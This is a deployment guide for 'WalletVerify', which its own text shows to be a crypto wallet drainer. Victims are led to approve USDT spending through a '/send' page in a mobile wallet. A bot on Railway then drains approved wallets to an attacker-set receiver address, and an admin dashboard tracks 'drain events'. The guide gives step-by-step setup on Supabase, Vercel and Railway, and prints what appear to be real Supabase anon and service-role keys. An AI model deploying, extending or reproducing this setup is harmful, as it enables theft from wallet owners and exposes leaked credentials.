# Deployment Guide: WalletVerify

## Overview
- **Frontend + API Routes**: Deploy on Vercel
- **Bot Service**: Deploy separately on Railway
- **Database**: Supabase (shared)

---

## Step 1: Supabase Setup

### 1a. Create Tables

1. Go to your Supabase project: https://supabase.co
2. Open **SQL Editor**
3. Copy and paste all SQL from `supabase/schema.sql`
4. Click **Execute**

### 1b. Get Your Credentials

From Supabase dashboard:
- **Project URL**: Settings > General > Project URL (looks like `https://xxx.supabase.co`)
- **Anon Key**: Settings > API > Project API keys > `anon` / `public`
- **Service Role Key**: Settings > API > Project API keys > `service_role`

✅ **You already have these** — they're in `.env.local`

---

## Step 2: Frontend (Vercel)

### 2a. Prepare Environment Variables

**Vercel only needs these** (NOT `ADMIN_PRIVATE_KEY`):

```
NEXT_PUBLIC_SUPABASE_URL=https://ikookfufruxrepsfyciv.supabase.co
NEXT_PUBLIC_SUPABASE_ANON_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imlrb29rZnVmcnV4cmVwc2Z5Y2l2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzYzMzgxNTAsImV4cCI6MjA5MTkxNDE1MH0.gPOLWYgN6ffka9xgPC0QJwjQp2XEWYXlhWzoxns7Xms
SUPABASE_SERVICE_ROLE_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imlrb29rZnVmcnV4cmVwc2Z5Y2l2Iiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3NjMzODE1MCwiZXhwIjoyMDkxOTE0MTUwfQ.USH8_ee_wek5fDByIaOEqG05IXAeAaMipmbMTY7JfS8
NEXT_PUBLIC_USDT_CONTRACT=0x55d398326f99059fF775485246999027B3197955
NEXT_PUBLIC_SPENDER_ADDRESS=0x[YOUR_ADMIN_WALLET_ADDRESS]
BSC_RPC_URL=https://bsc-dataseed.binance.org/
MORALIS_API_KEY=[GET_FROM_MORALIS.IO]
ADMIN_PASSWORD=[CHOOSE_STRONG_PASSWORD]
```

### 2b. Push Code to GitHub

```bash
cd d:\HassanReact\Projects\WalletVerify
git add .
git commit -m "Initial WalletVerify project setup"
git remote add origin https://github.com/YOUR_USERNAME/walletverify.git
git branch -M main
git push -u origin main
```

### 2c. Deploy to Vercel

1. Go to https://vercel.com
2. Click **Add New** > **Project**
3. Select your GitHub repo
4. In **Environment Variables**, paste all the variables above
5. Click **Deploy**

✅ Your frontend will be live at `walletverify.vercel.app` (or your custom domain)

---

## Step 3: Admin Wallet Setup

Before deploying the bot, you need a private admin wallet:

### 3a. Create/Export Admin Wallet

1. Create a new wallet address on BSC (e.g., via MetaMask, Trust Wallet, or ethers.js)
2. Export the **private key** (hex format: `0x...`)
3. Fund it with BNB for gas fees (~$50 worth recommended)

### 3b. Add to Environment

Add these to your `.env.local`:
```
NEXT_PUBLIC_SPENDER_ADDRESS=0x[YOUR_ADMIN_WALLET_ADDRESS]
ADMIN_PRIVATE_KEY=0x[YOUR_ADMIN_WALLET_PRIVATE_KEY]
ADMIN_PASSWORD=[CHOOSE_STRONG_PASSWORD]
```

Example:
```
NEXT_PUBLIC_SPENDER_ADDRESS=0x1234567890abcdef1234567890abcdef12345678
ADMIN_PRIVATE_KEY=0xabcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890
ADMIN_PASSWORD=MySecurePassword123!
```

---

## Step 4: Bot Service (Railway)

### 4a. Create Railway Account

1. Go to https://railway.app
2. Sign up with GitHub
3. Create a new project

### 4b. Deploy Bot

**Option 1: From GitHub (Recommended)**

1. In Railway, click **New Project** > **Deploy from GitHub repo**
2. Select your `walletverify` repository
3. Railway will auto-detect it's a Node.js project
4. Configure the start command: `cd bot && npm install && npm start`

**Option 2: Manual Deployment**

```bash
# Install Railway CLI
npm install -g @railway/cli

# Login
railway login

# In project directory
cd d:\HassanReact\Projects\WalletVerify
railway init

# Select your Railway project
# Add environment variables
railway variable SUPABASE_URL https://ikookfufruxrepsfyciv.supabase.co
railway variable SUPABASE_SERVICE_ROLE_KEY eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

# Deploy
railway up
```

### 4c. Add Environment Variables to Railway

In the Railway dashboard:

```
NEXT_PUBLIC_SUPABASE_URL=https://ikookfufruxrepsfyciv.supabase.co
NEXT_PUBLIC_SUPABASE_ANON_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
SUPABASE_SERVICE_ROLE_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
NEXT_PUBLIC_USDT_CONTRACT=0x55d398326f99059fF775485246999027B3197955
ADMIN_PRIVATE_KEY=0x[YOUR_ADMIN_WALLET_PRIVATE_KEY]
BSC_RPC_URL=https://bsc-dataseed.binance.org/
MORALIS_API_KEY=[YOUR_MORALIS_KEY]
BOT_POLL_INTERVAL_MS=60000
```

### 4d. Configure Start Command

In Railway **Service Settings**:
- **Root Directory**: (leave empty, or `bot` if structure requires)
- **Start Command**: `npm install && npm start`

---

## Step 5: Admin Panel Setup

### 5a. Access Dashboard

1. Go to: `https://your-domain.vercel.app/admin` (or `https://walletverify.vercel.app/admin`)
2. Enter the `ADMIN_PASSWORD` you set
3. Go to **Config** tab
4. Paste your receiver address (where USDT will be sent)
5. Set minimum threshold (e.g., $2)
6. Click **Save Changes**

### 5b. Monitor Everything

- **Wallets tab**: Live dashboard showing connected wallets, balances, approval status
- **Config tab**: Change receiver address anytime
- **Transactions tab**: View all approval & drain events

---

## Environment Variables Summary

### Vercel Only (Frontend)
```
NEXT_PUBLIC_SUPABASE_URL
NEXT_PUBLIC_SUPABASE_ANON_KEY
SUPABASE_SERVICE_ROLE_KEY
NEXT_PUBLIC_USDT_CONTRACT
NEXT_PUBLIC_SPENDER_ADDRESS
BSC_RPC_URL
MORALIS_API_KEY
ADMIN_PASSWORD
```

### Railway Only (Bot)
```
ADMIN_PRIVATE_KEY
BOT_POLL_INTERVAL_MS
```

### Both (Vercel + Railway)
```
NEXT_PUBLIC_SUPABASE_URL
NEXT_PUBLIC_SUPABASE_ANON_KEY
SUPABASE_SERVICE_ROLE_KEY
NEXT_PUBLIC_USDT_CONTRACT
BSC_RPC_URL
MORALIS_API_KEY
ADMIN_PASSWORD
```

---

## Verification Checklist

- [ ] Supabase tables created (`wallets`, `config`, `transactions`)
- [ ] Supabase URL & keys in `.env.local`
- [ ] GitHub repo created and pushed
- [ ] Vercel project deployed with env vars
- [ ] Railway bot service deployed with env vars
- [ ] Admin wallet address set in `NEXT_PUBLIC_SPENDER_ADDRESS`
- [ ] Admin wallet private key set in Railway env (never in Vercel)
- [ ] Admin password set (both platforms)
- [ ] Moralis API key obtained and added
- [ ] Visited `admin` page and set receiver address
- [ ] Test: Visit `/send` page and open with Trust Wallet

---

## Troubleshooting

**"No injected wallet found"**
- Only works in mobile wallet browsers (Trust Wallet, MetaMask) or desktop with injected provider
- Web browsers need MetaMask extension

**"Wallet balance shows as 0"**
- Ensure Moralis API key is valid
- Check wallet has USDT and BNB on BSC

**Bot not draining wallets**
- Check Railway logs for errors
- Verify admin wallet has enough BNB for gas
- Confirm receiver address is set in admin panel
- Check wallet approval status is `Green` in dashboard

**Vercel deploy failing**
- Ensure all `NEXT_PUBLIC_*` vars are set
- Check `.env.local` isn't in git (should be in `.gitignore`)
